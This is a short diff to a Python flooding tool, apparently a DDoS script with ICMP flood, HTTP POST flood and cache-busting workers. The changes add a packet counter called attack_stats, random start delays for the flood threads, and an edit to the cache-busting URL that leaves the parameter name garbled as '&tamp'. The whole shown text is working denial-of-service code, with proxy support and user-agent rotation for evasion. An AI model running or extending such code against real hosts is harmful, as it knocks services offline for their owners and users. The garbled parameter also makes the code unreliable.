@@ -35,8 +35,8 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
 ]
 
-open_ports = []
-ports_lock = threading.Lock()
+attack_stats = {"packets_sent": 0}
+stats_lock = threading.Lock()
 
 
 # --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
@@ -377,6 +377,7 @@ def icmpflood(target_url, duration, stop_event, pause_event, threads=150, iface=
 
 def http_post_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
     """Worker thread that sends a continuous stream of HTTP POST requests, optionally via a SOCKS proxy."""
+    time.sleep(random.uniform(0.01, 0.5))
     s = None  # Initialize s to None for robust error handling
     while not stop_event.is_set():
         if pause_event.is_set():
@@ -660,7 +661,7 @@ def http_cache_bust_worker(stop_event, pause_event, target_ip, port, host_header
             timestamp = int(time.time())
 
             # Construct the unique path
-            path = f"/?query={random_string}×tamp={timestamp}"
+            path = f"/?query={random_string}&tamp={timestamp}"
 
             user_agent = random.choice(USER_AGENTS)
 
